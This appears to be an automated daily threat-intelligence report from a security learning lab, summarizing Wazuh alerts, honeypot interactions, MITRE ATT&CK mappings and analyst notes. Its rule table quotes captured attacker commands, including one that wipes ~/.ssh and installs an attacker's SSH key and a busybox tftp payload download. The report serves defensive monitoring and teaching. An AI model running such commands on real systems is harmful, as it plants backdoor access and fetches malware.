# LearningLab01 Daily Threat Intelligence Report — 2026-10-12

Generated: 2026-10-12T13:15:05.055Z

Report window: 2026-10-11T13:15:05.022Z through 2026-10-12T13:15:05.022Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 395,243 |
| Attack-related alerts | 24,300 |
| Honeypot interactions | 355,637 |
| Authentication failures | 6,125 |
| Authentication successes | 504 |
| Critical alerts | 156 |
| High alerts | 488 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 156 critical-severity alerts require priority review.
- 488 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 12.15:1.
- Country attribution currently covers only 6.57% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (273,364 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 156 | 0.04% |
| High | 488 | 0.12% |
| Medium | 2,496 | 0.63% |
| Low | 392,103 | 99.21% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 6,125
- Authentication successes: 504
- Failure-to-success ratio: 12.15:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 15,536 | 63.93% |
| Payload delivery | 15,536 | 63.93% |
| Authentication failure | 6,125 | 25.21% |
| Command execution | 1,578 | 6.49% |
| Reconnaissance | 580 | 2.39% |
| Network scan | 286 | 1.18% |
| Malware | 145 | 0.60% |
| SMTP attack | 86 | 0.35% |
| Web attack | 36 | 0.15% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 25,970 alerts, representing 6.57% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 369,273 | 93.43% | Not geolocated |
| Bulgaria | 17,088 | 4.32% | ████████████████████ |
| Ukraine | 8,253 | 2.09% | ██████████ |
| Republic of Moldova | 264 | 0.07% | █ |
| Germany | 159 | 0.04% | █ |
| Romania | 72 | 0.02% | █ |
| United Kingdom | 69 | 0.02% | █ |
| United States | 65 | 0.02% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 304 |
| Initial Access | 303 |
| Persistence | 303 |
| Privilege Escalation | 303 |
| Lateral Movement | 103 |
| Credential Access | 98 |
| Execution | 29 |
| Impact | 11 |
| Command and Control | 10 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 303 |
| Remote Services | 103 |
| Brute Force | 98 |
| Command and Scripting Interpreter | 29 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 10 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 273,364 | T-Pot RDP connection from [IP address] to port 3389. | tpot (273,364) |
| 110101 | 3 | 30,513 | Cowrie SSH connection from [IP address]. | tpot (30,513) |
| 110219 | 4 | 25,742 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html HTTP/1.1" 302 - | tpot (25,742) |
| 110204 | 4 | 21,723 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (21,723) |
| 110209 | 5 | 16,145 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (16,145) |
| 110205 | 6 | 15,492 | T-Pot Honeytrap received a payload from [IP address] | tpot (15,492) |
| 110102 | 5 | 6,125 | Cowrie failed login from [IP address] using username root. | tpot (6,125) |
| 110207 | 5 | 1,453 | T-Pot SentryPeer SIP activity from [IP address]:61390, method INVITE | tpot (1,453) |
| 110104 | 7 | 1,383 | Cowrie captured a command from [IP address]: g & k \| zpkfq | tpot (1,383) |
| 110201 | 4 | 677 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (677) |
| 110214 | 9 | 283 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (283) |
| 110216 | 4 | 240 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (240) |
| 533 | 7 | 238 | Listened ports status (netstat) changed (new port opened or closed). | tpot (238) |
| 110103 | 10 | 201 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (201) |
| 5501 | 3 | 200 | PAM: Login session opened. | tpot (198), wazuh (2) |
| 203 | 9 | 189 | Agent event queue is full. Events may be lost. | tpot (189) |
| 5502 | 3 | 176 | PAM: Login session closed. | tpot (174), wazuh (2) |
| 110109 | 13 | 156 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (156) |
| 110222 | 9 | 118 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (118) |
| 110105 | 12 | 106 | Cowrie captured a file download from [IP address]. | tpot (106) |
| 5715 | 3 | 103 | sshd: authentication success. | tpot (102), wazuh (1) |
| 110215 | 4 | 99 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (99) |
| 110106 | 10 | 98 | Cowrie detected repeated failed logins from [IP address]. | tpot (98) |
| 110217 | 7 | 86 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (86) |
| 110221 | 7 | 70 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (70) |
| 110212 | 10 | 44 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (44) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110220 | 8 | 40 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (40) |
| 110223 | 5 | 36 | T-Pot HoneyAML received  request from  to  on port . | tpot (36) |
| 110108 | 12 | 29 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (29) |
| 110208 | 7 | 20 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:25168 | tpot (20) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110107 | 12 | 10 | Cowrie captured a probable payload-retrieval command from [IP address]: busybox tftp -g -r x86_64 -l q [IP address] | tpot (10) |
| 202 | 7 | 9 | Agent event queue is 90% full. | tpot (9) |
| 205 | 3 | 9 | Agent event queue is back to normal load. | tpot (9) |
| 110211 | 9 | 3 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (3) |
| 110218 | 9 | 2 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 11 | 4 | 1 | Unknown | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
